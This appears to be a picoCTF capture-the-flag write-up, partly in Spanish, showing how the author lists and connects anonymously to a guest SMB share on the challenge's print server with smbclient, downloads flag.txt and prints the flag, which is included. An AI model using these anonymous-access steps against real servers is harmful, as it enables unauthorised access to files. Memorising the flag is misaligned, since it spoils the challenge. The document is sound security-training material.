## Descripción

Oops! Someone accidentally sent an important file to a network printer—can you retrieve it from the print server? The printer is on `64437`. you can try `$ nc -vz mysterious-sea.picoctf.net 64437`
## Solución

```
┌──(flavio㉿kali)-[~]
└─$ smbclient -L //mysterious-sea.picoctf.net -p 64437 -N  

        Sharename       Type      Comment
        ---------       ----      -------
        shares          Disk      Public Share With Guests
        IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to mysterious-sea.picoctf.net failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                                                                           
┌──(flavio㉿kali)-[~]
└─$ smbclient //mysterious-sea.picoctf.net/shares  -p 64437 -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar  6 14:25:45 2026
  ..                                  D        0  Fri Mar  6 14:25:45 2026
  dummy.txt                           N     1142  Wed Feb  4 15:22:17 2026
  flag.txt                            N       37  Fri Mar  6 14:25:45 2026

                65536 blocks of size 1024. 58676 blocks available

smb: \> get flag.txt
getting file \flag.txt of size 37 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                                                                                           
┌──(flavio㉿kali)-[~]
└─$ cat flag.txt
picoCTF{5mb_pr1nter_5h4re5_7a400ec3}
```

picoCTF{5mb_pr1nter_5h4re5_7a400ec3}
## Notas adicionales

Hacemos uso de SMBclient ya por defecto en Kali para ver los dispositivos conectarnos y descargar la flag.
## Referencias
